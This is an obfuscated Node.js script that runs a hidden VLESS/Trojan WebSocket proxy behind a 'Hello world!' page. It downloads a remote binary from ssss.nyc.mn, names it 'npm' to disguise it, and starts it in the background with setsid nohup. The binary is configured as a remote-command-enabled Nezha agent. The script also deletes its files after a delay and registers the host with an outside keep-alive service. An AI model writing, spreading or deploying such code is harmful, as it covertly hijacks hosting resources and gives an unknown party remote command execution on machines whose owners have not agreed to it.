const _0x3d9675=_0x4ff6;(function(_0x598982,_0x244098){const _0x523835=_0x4ff6,_0x54d91f=_0x598982();while(!![]){try{const _0x144fff=parseInt(_0x523835(0x239))/0x1+-parseInt(_0x523835(0x1df))/0x2+-parseInt(_0x523835(0x23a))/0x3+-parseInt(_0x523835(0x25d))/0x4+parseInt(_0x523835(0x256))/0x5+-parseInt(_0x523835(0x240))/0x6*(-parseInt(_0x523835(0x25f))/0x7)+-parseInt(_0x523835(0x230))/0x8*(-parseInt(_0x523835(0x1fa))/0x9);if(_0x144fff===_0x244098)break;else _0x54d91f['push'](_0x54d91f['shift']());}catch(_0xe59689){_0x54d91f['push'](_0x54d91f['shift']());}}}(_0x114a,0x8d7a0));const os=require('os'),http=require(_0x3d9675(0x1fb)),fs=require('fs'),axios=require(_0x3d9675(0x1ef)),net=require(_0x3d9675(0x255)),path=require(_0x3d9675(0x229)),crypto=require(_0x3d9675(0x204)),{Buffer}=require(_0x3d9675(0x218)),{exec,execSync}=require(_0x3d9675(0x208)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3d9675(0x1e6)]||'f6c246eb-e5bc-4e58-8676-7ee339ddde21',NEZHA_SERVER=process['env'][_0x3d9675(0x220)]||'',NEZHA_PORT=process[_0x3d9675(0x227)][_0x3d9675(0x24d)]||'',NEZHA_KEY=process[_0x3d9675(0x227)][_0x3d9675(0x20e)]||'',DOMAIN=process[_0x3d9675(0x227)][_0x3d9675(0x1fe)]||_0x3d9675(0x205),AUTO_ACCESS=process[_0x3d9675(0x227)][_0x3d9675(0x24a)]||!![],WSPATH=process[_0x3d9675(0x227)][_0x3d9675(0x238)]||UUID[_0x3d9675(0x1ff)](0x0,0x8),SUB_PATH=process[_0x3d9675(0x227)][_0x3d9675(0x22b)]||'hanjianfeng20221107',NAME=process[_0x3d9675(0x227)][_0x3d9675(0x221)]||_0x3d9675(0x24e),PORT=process[_0x3d9675(0x227)][_0x3d9675(0x222)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3fae54=_0x3d9675;try{const _0x409e08=await axios['get'](_0x3fae54(0x243)),_0x721821=_0x409e08['data'];ISP=(_0x721821[_0x3fae54(0x1e9)]+'-'+_0x721821[_0x3fae54(0x1ea)])[_0x3fae54(0x209)](/ /g,'_');}catch(_0x2ce999){ISP=_0x3fae54(0x237);}};GetISP();const httpServer=http[_0x3d9675(0x234)]((_0x20bd2b,_0x2b1198)=>{const _0x1d9db7=_0x3d9675;if(_0x20bd2b[_0x1d9db7(0x252)]==='/'){const _0x570c6d=path[_0x1d9db7(0x226)](__dirname,'index.html');fs[_0x1d9db7(0x207)](_0x570c6d,_0x1d9db7(0x242),(_0x43869b,_0x48ac86)=>{const _0x262fe2=_0x1d9db7;if(_0x43869b){_0x2b1198[_0x262fe2(0x1fc)](0xc8,{'Content-Type':_0x262fe2(0x24c)}),_0x2b1198[_0x262fe2(0x1f6)](_0x262fe2(0x1f7));return;}_0x2b1198['writeHead'](0xc8,{'Content-Type':_0x262fe2(0x24c)}),_0x2b1198['end'](_0x48ac86);});return;}else{if(_0x20bd2b[_0x1d9db7(0x252)]==='/'+SUB_PATH){const _0x300796=_0x1d9db7(0x210)+UUID+'@'+DOMAIN+_0x1d9db7(0x22a)+DOMAIN+_0x1d9db7(0x213)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x1eb2b8=_0x1d9db7(0x20c)+UUID+'@'+DOMAIN+_0x1d9db7(0x216)+DOMAIN+_0x1d9db7(0x213)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x2d363c=_0x300796+'\x0a'+_0x1eb2b8,_0x246d63=Buffer[_0x1d9db7(0x24f)](_0x2d363c)[_0x1d9db7(0x23d)](_0x1d9db7(0x253));_0x2b1198['writeHead'](0xc8,{'Content-Type':_0x1d9db7(0x20a)}),_0x2b1198[_0x1d9db7(0x1f6)](_0x246d63+'\x0a');}else _0x2b1198[_0x1d9db7(0x1fc)](0x194,{'Content-Type':_0x1d9db7(0x20a)}),_0x2b1198[_0x1d9db7(0x1f6)](_0x1d9db7(0x211));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3d9675(0x209)](/-/g,''),DNS_SERVERS=[_0x3d9675(0x261),_0x3d9675(0x1e3)];function resolveHost(_0x495963){return new Promise((_0x239357,_0x1fd56e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x495963)){_0x239357(_0x495963);return;}let _0x571e66=0x0;function _0x537cb4(){const _0x34c251=_0x4ff6;if(_0x571e66>=DNS_SERVERS['length']){_0x1fd56e(new Error(_0x34c251(0x212)+_0x495963+_0x34c251(0x1ee)));return;}const _0xa0c67=DNS_SERVERS[_0x571e66];_0x571e66++;const _0x394159=_0x34c251(0x251)+encodeURIComponent(_0x495963)+_0x34c251(0x1e2);axios[_0x34c251(0x20b)](_0x394159,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x34c251(0x231)](_0x3677ef=>{const _0x31b9e7=_0x34c251,_0x5cabcb=_0x3677ef['data'];if(_0x5cabcb[_0x31b9e7(0x206)]===0x0&&_0x5cabcb[_0x31b9e7(0x214)]&&_0x5cabcb[_0x31b9e7(0x214)][_0x31b9e7(0x248)]>0x0){const _0x430359=_0x5cabcb[_0x31b9e7(0x214)][_0x31b9e7(0x219)](_0x1e35b5=>_0x1e35b5[_0x31b9e7(0x1fd)]===0x1);if(_0x430359){_0x239357(_0x430359[_0x31b9e7(0x202)]);return;}}_0x537cb4();})[_0x34c251(0x1f9)](_0x213c53=>{_0x537cb4();});}_0x537cb4();});}function handleVlessConnection(_0x38d8bd,_0xdb2203){const _0x5ce0d5=_0x3d9675,[_0x2dacdf]=_0xdb2203,_0x45955a=_0xdb2203[_0x5ce0d5(0x1ff)](0x1,0x11);if(!_0x45955a[_0x5ce0d5(0x1e4)]((_0x321242,_0x20ef60)=>_0x321242==parseInt(uuid['substr'](_0x20ef60*0x2,0x2),0x10)))return![];let _0x14e649=_0xdb2203[_0x5ce0d5(0x1ff)](0x11,0x12)[_0x5ce0d5(0x20f)]()+0x13;const _0xd73cc0=_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649,_0x14e649+=0x2)[_0x5ce0d5(0x258)](0x0),_0x2fc12d=_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649,_0x14e649+=0x1)[_0x5ce0d5(0x20f)](),_0x1cdd67=_0x2fc12d==0x1?_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649,_0x14e649+=0x4)[_0x5ce0d5(0x226)]('.'):_0x2fc12d==0x2?new TextDecoder()['decode'](_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649+0x1,_0x14e649+=0x1+_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649,_0x14e649+0x1)[_0x5ce0d5(0x20f)]())):_0x2fc12d==0x3?_0xdb2203[_0x5ce0d5(0x1ff)](_0x14e649,_0x14e649+=0x10)[_0x5ce0d5(0x262)]((_0x4a20f6,_0x39555d,_0xace9b5,_0xe33de)=>_0xace9b5%0x2?_0x4a20f6[_0x5ce0d5(0x217)](_0xe33de[_0x5ce0d5(0x1ff)](_0xace9b5-0x1,_0xace9b5+0x1)):_0x4a20f6,[])[_0x5ce0d5(0x22e)](_0x56733a=>_0x56733a[_0x5ce0d5(0x258)](0x0)[_0x5ce0d5(0x23d)](0x10))[_0x5ce0d5(0x226)](':'):'';_0x38d8bd[_0x5ce0d5(0x1f8)](new Uint8Array([_0x2dacdf,0x0]));const _0x4e597c=createWebSocketStream(_0x38d8bd);return resolveHost(_0x1cdd67)[_0x5ce0d5(0x231)](_0x24ffd9=>{const _0x29ef1b=_0x5ce0d5;net[_0x29ef1b(0x21b)]({'host':_0x24ffd9,'port':_0xd73cc0},function(){const _0x5a45c0=_0x29ef1b;this[_0x5a45c0(0x203)](_0xdb2203[_0x5a45c0(0x1ff)](_0x14e649)),_0x4e597c['on'](_0x5a45c0(0x1e7),()=>{})[_0x5a45c0(0x232)](this)['on'](_0x5a45c0(0x1e7),()=>{})['pipe'](_0x4e597c);})['on'](_0x29ef1b(0x1e7),()=>{});})[_0x5ce0d5(0x1f9)](_0xbaf4e0=>{const _0x5bf871=_0x5ce0d5;net[_0x5bf871(0x21b)]({'host':_0x1cdd67,'port':_0xd73cc0},function(){const _0x569075=_0x5bf871;this[_0x569075(0x203)](_0xdb2203[_0x569075(0x1ff)](_0x14e649)),_0x4e597c['on'](_0x569075(0x1e7),()=>{})[_0x569075(0x232)](this)['on']('error',()=>{})[_0x569075(0x232)](_0x4e597c);})['on'](_0x5bf871(0x1e7),()=>{});}),!![];}function handleTrojanConnection(_0x19aa94,_0x41e643){const _0x341556=_0x3d9675;try{if(_0x41e643['length']<0x3a)return![];const _0x4465d9=_0x41e643[_0x341556(0x1ff)](0x0,0x38)[_0x341556(0x23d)](),_0x311163=[UUID];let _0x3261bb=null;for(const _0x3acb3a of _0x311163){const _0x57f3b6=crypto[_0x341556(0x249)]('sha224')[_0x341556(0x25e)](_0x3acb3a)[_0x341556(0x23c)]('hex');if(_0x57f3b6===_0x4465d9){_0x3261bb=_0x3acb3a;break;}}if(!_0x3261bb)return![];let _0x970322=0x38;_0x41e643[_0x970322]===0xd&&_0x41e643[_0x970322+0x1]===0xa&&(_0x970322+=0x2);const _0x7feef0=_0x41e643[_0x970322];if(_0x7feef0!==0x1)return![];_0x970322+=0x1;const _0x2029ee=_0x41e643[_0x970322];_0x970322+=0x1;let _0x148d9b,_0x22890f;if(_0x2029ee===0x1)_0x148d9b=_0x41e643[_0x341556(0x1ff)](_0x970322,_0x970322+0x4)[_0x341556(0x226)]('.'),_0x970322+=0x4;else{if(_0x2029ee===0x3){const _0x3cbda7=_0x41e643[_0x970322];_0x970322+=0x1,_0x148d9b=_0x41e643['slice'](_0x970322,_0x970322+_0x3cbda7)['toString'](),_0x970322+=_0x3cbda7;}else{if(_0x2029ee===0x4)_0x148d9b=_0x41e643[_0x341556(0x1ff)](_0x970322,_0x970322+0x10)['reduce']((_0x18acc8,_0x27dbf3,_0x2bf361,_0x3b9e54)=>_0x2bf361%0x2?_0x18acc8[_0x341556(0x217)](_0x3b9e54[_0x341556(0x1ff)](_0x2bf361-0x1,_0x2bf361+0x1)):_0x18acc8,[])['map'](_0x19d086=>_0x19d086[_0x341556(0x258)](0x0)[_0x341556(0x23d)](0x10))['join'](':'),_0x970322+=0x10;else return![];}}_0x22890f=_0x41e643[_0x341556(0x258)](_0x970322),_0x970322+=0x2;_0x970322<_0x41e643[_0x341556(0x248)]&&_0x41e643[_0x970322]===0xd&&_0x41e643[_0x970322+0x1]===0xa&&(_0x970322+=0x2);const _0x22e42b=createWebSocketStream(_0x19aa94);return resolveHost(_0x148d9b)[_0x341556(0x231)](_0x39b48f=>{const _0x17d747=_0x341556;net[_0x17d747(0x21b)]({'host':_0x39b48f,'port':_0x22890f},function(){const _0x52c12d=_0x17d747;_0x970322<_0x41e643[_0x52c12d(0x248)]&&this[_0x52c12d(0x203)](_0x41e643[_0x52c12d(0x1ff)](_0x970322)),_0x22e42b['on'](_0x52c12d(0x1e7),()=>{})[_0x52c12d(0x232)](this)['on']('error',()=>{})[_0x52c12d(0x232)](_0x22e42b);})['on']('error',()=>{});})['catch'](_0x3de3ed=>{const _0x104600=_0x341556;net[_0x104600(0x21b)]({'host':_0x148d9b,'port':_0x22890f},function(){const _0x59dcae=_0x104600;_0x970322<_0x41e643[_0x59dcae(0x248)]&&this[_0x59dcae(0x203)](_0x41e643[_0x59dcae(0x1ff)](_0x970322)),_0x22e42b['on'](_0x59dcae(0x1e7),()=>{})['pipe'](this)['on'](_0x59dcae(0x1e7),()=>{})['pipe'](_0x22e42b);})['on'](_0x104600(0x1e7),()=>{});}),!![];}catch(_0x256ab4){return![];}}function _0x4ff6(_0x3f0427,_0x498b1c){_0x3f0427=_0x3f0427-0x1df;const _0x114a36=_0x114a();let _0x4ff67b=_0x114a36[_0x3f0427];return _0x4ff67b;}wss['on'](_0x3d9675(0x21e),(_0x578977,_0x265095)=>{const _0x459feb=_0x3d9675,_0x49153c=_0x265095[_0x459feb(0x252)]||'';_0x578977[_0x459feb(0x1f5)](_0x459feb(0x244),_0x39111b=>{const _0x413484=_0x459feb;if(_0x39111b[_0x413484(0x248)]>0x11&&_0x39111b[0x0]===0x0){const _0x74da22=_0x39111b[_0x413484(0x1ff)](0x1,0x11),_0x2103eb=_0x74da22[_0x413484(0x1e4)]((_0x73cc1,_0x6f3a6f)=>_0x73cc1==parseInt(uuid[_0x413484(0x25b)](_0x6f3a6f*0x2,0x2),0x10));if(_0x2103eb){!handleVlessConnection(_0x578977,_0x39111b)&&_0x578977['close']();return;}}!handleTrojanConnection(_0x578977,_0x39111b)&&_0x578977[_0x413484(0x21d)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x4d7032=_0x3d9675,_0x4cac01=os[_0x4d7032(0x22d)]();return _0x4cac01===_0x4d7032(0x1f0)||_0x4cac01===_0x4d7032(0x1ed)||_0x4cac01===_0x4d7032(0x200)?!NEZHA_PORT?_0x4d7032(0x241):_0x4d7032(0x25c):!NEZHA_PORT?_0x4d7032(0x250):_0x4d7032(0x1e8);},downloadFile=async()=>{const _0x2bf0df=_0x3d9675;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4c83df=getDownloadUrl(),_0x135bda=await axios({'method':_0x2bf0df(0x20b),'url':_0x4c83df,'responseType':_0x2bf0df(0x260)}),_0x5bc3a4=fs[_0x2bf0df(0x259)]('npm');return _0x135bda[_0x2bf0df(0x202)][_0x2bf0df(0x232)](_0x5bc3a4),new Promise((_0x163204,_0x5c09fb)=>{const _0xfa7ec3=_0x2bf0df;_0x5bc3a4['on'](_0xfa7ec3(0x254),()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x5116e2=>{if(_0x5116e2)_0x5c09fb(_0x5116e2);_0x163204();});}),_0x5bc3a4['on']('error',_0x5c09fb);});}catch(_0x966f0a){throw _0x966f0a;}},runnz=async()=>{const _0x2e1561=_0x3d9675;try{const _0x196073=execSync(_0x2e1561(0x24b),{'encoding':_0x2e1561(0x21f)});if(_0x196073[_0x2e1561(0x247)]()!==''){console[_0x2e1561(0x1eb)](_0x2e1561(0x23b));return;}}catch(_0x20cd94){}await downloadFile();let _0x20522a='',_0x25cf43=[_0x2e1561(0x233),_0x2e1561(0x245),_0x2e1561(0x23f),_0x2e1561(0x23e),'2083',_0x2e1561(0x201)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1f66b9=_0x25cf43['includes'](NEZHA_PORT)?_0x2e1561(0x22c):'';_0x20522a='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2e1561(0x223)+NEZHA_KEY+'\x20'+_0x1f66b9+_0x2e1561(0x1f1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b9987=NEZHA_SERVER[_0x2e1561(0x236)](':')?NEZHA_SERVER[_0x2e1561(0x21a)](':')[_0x2e1561(0x1f2)]():'',_0x2199fe=_0x25cf43['includes'](_0x5b9987)?'true':'false',_0x28df53='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2e1561(0x21c)+_0x2199fe+_0x2e1561(0x1e5)+UUID;fs[_0x2e1561(0x20d)](_0x2e1561(0x228),_0x28df53);}_0x20522a=_0x2e1561(0x225);}else{console[_0x2e1561(0x1eb)](_0x2e1561(0x25a));return;}}try{exec(_0x20522a,{'shell':_0x2e1561(0x1f3)},_0x10317e=>{const _0x23e678=_0x2e1561;if(_0x10317e)console[_0x23e678(0x1e7)](_0x23e678(0x235),_0x10317e);else console[_0x23e678(0x1eb)](_0x23e678(0x246));});}catch(_0x42de02){console['error'](_0x2e1561(0x257)+_0x42de02);}};async function addAccessTask(){const _0x5bd043=_0x3d9675;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xe09902=_0x5bd043(0x1e1)+DOMAIN;try{const _0x3865aa=await axios['post']('https://oooo.serv00.net/add-url',{'url':_0xe09902},{'headers':{'Content-Type':_0x5bd043(0x1f4)}});console[_0x5bd043(0x1eb)](_0x5bd043(0x1e0));}catch(_0x13fe8e){}}function _0x114a(){const _0x2d2257=['buffer','find','split','connect','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','connection','utf-8','NEZHA_SERVER','NAME','PORT','\x20-p\x20','unlink','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','join','env','config.yaml','path',':443?encryption=none&security=tls&sni=','SUB_PATH','--tls','arch','map','Server\x20is\x20running\x20on\x20port\x20','75056KuxWfH','then','pipe','443','createServer','npm\x20running\x20error:','includes','Unknown','WSPATH','715887cOYGTv','2671359ypcZNa','npm\x20is\x20already\x20running,\x20skip\x20running...','digest','toString','2087','2096','5757924gIhwuF','https://arm64.ssss.nyc.mn/v1','utf8','https://speed.cloudflare.com/meta','message','8443','npm\x20is\x20running','trim','length','createHash','AUTO_ACCESS','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','text/html','NEZHA_PORT','Hug','from','https://amd64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','url','base64','finish','net','122500KeMUnJ','error:\x20','readUInt16BE','createWriteStream','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','substr','https://arm64.ssss.nyc.mn/agent','461300abuXDY','update','7hJjLZd','stream','8.8.4.4','reduce','511010gWmIEW','Automatic\x20Access\x20Task\x20added\x20successfully','https://','&type=A','1.1.1.1','every','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','error','https://amd64.ssss.nyc.mn/agent','country','asOrganization','log','npm','arm64','\x20with\x20all\x20DNS\x20servers','axios','arm','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','pop','/bin/bash','application/json','once','end','Hello\x20world!','send','catch','135lGxakq','http','writeHead','type','DOMAIN','slice','aarch64','2053','data','write','crypto','1234.abc.com','Status','readFile','child_process','replace','text/plain','get','trojan://','writeFileSync','NEZHA_KEY','readUInt8','vless://','Not\x20Found\x0a','Failed\x20to\x20resolve\x20','&fp=chrome&type=ws&host=','Answer','listen',':443?security=tls&sni=','concat'];_0x114a=function(){return _0x2d2257;};return _0x114a();}const delFiles=()=>{const _0x1b9607=_0x3d9675;fs['unlink'](_0x1b9607(0x1ec),()=>{}),fs[_0x1b9607(0x224)]('config.yaml',()=>{});};httpServer[_0x3d9675(0x215)](PORT,()=>{const _0x14723b=_0x3d9675;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x14723b(0x1eb)](_0x14723b(0x22f)+PORT);});
